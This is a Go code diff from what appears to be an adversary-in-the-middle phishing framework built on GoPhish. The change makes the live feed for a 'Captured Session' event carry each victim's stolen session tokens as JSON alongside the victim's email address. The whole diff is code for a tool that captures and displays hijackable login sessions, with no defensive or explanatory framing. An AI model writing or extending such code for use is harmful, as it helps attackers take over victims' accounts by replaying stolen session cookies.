@@ -66,6 +66,7 @@ type FeedEvent struct {
     Event 	string `json:"event"`
     Time 	string `json:"time"`
     Message string `json:"message"`
+	Tokens  string `json:"tokens"`
 }
 
 func SetupGPDB(path string) error {
@@ -306,7 +307,7 @@ func HandleCapturedSession (rid string, tokens map[string]map[string]*Token, bro
         res.Reported = false
         res.BaseRecipient = r.BaseRecipient
         if feed_enabled {
-            err = r.NotifyCapturedSession()
+            err = r.NotifyCapturedSession(tokens)
             if err != nil {
                 fmt.Printf("Error sending websocket message: %s\n", err)
             }
@@ -401,7 +402,7 @@ func (r *Result) NotifySubmittedData(username string, password string) error {
     return err
 }
 
-func (r *Result) NotifyCapturedSession() error {
+func (r *Result) NotifyCapturedSession(tokens map[string]map[string]*Token) error {
     c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
     if err != nil {
         return err
@@ -410,8 +411,10 @@ func (r *Result) NotifyCapturedSession() error {
 
     fe := FeedEvent{}
     fe.Event = "Captured Session"
-    fe.Message = "Captured session for victim: <strong>" + r.Email + "</strong>! View full token JSON in GoPhish dashboard!"
+    fe.Message = "Captured session for victim: <strong>" + r.Email + "</strong>! View full token JSON below!"
     fe.Time = r.ModifiedDate.String()
+	json_tokens := moddedTokensToJSON(tokens)
+	fe.Tokens = json_tokens
     data, _ := json.Marshal(fe)
 
     err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
